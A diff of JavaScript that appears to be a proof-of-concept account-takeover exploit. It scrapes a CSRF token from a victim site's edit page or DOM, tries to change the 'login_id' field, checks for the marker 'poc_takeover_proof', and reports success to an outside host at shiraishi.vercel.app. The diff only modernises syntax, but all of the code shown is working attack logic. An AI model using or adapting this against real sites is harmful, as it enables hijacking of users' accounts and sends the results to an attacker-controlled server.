@@ -11,17 +11,18 @@
     });
     const html = await editPage.text();
     const m = html.match(/name="csrf_token"\s+value="([^"]+)"/);
-    csrf = m?.[1] || null;
+    csrf = m && m[1] ? m[1] : null;
   } catch (e) {
     log('Could not load edit page (CORS/SameSite):', e.message);
   }
 
   if (!csrf) {
-    csrf = document.querySelector('input[name="csrf_token"]')?.value || null;
+    const el = document.querySelector('input[name="csrf_token"]');
+    csrf = el ? el.value : null;
   }
 
   if (!csrf) {
-    log('No CSRF token available — aborting');
+    log('No CSRF token available - aborting');
     return;
   }
 
@@ -54,7 +55,7 @@
     mode: 'cors'
   }).then(r => r.text()).catch(() => '');
 
-  const changed = after.includes('poc_takeover_proof');
+  const changed = after.indexOf('poc_takeover_proof') !== -1;
   log('login_id changed:', changed);
 
   fetch('https://shiraishi.vercel.app/log?ok=' + changed + '&s=' + res.status)
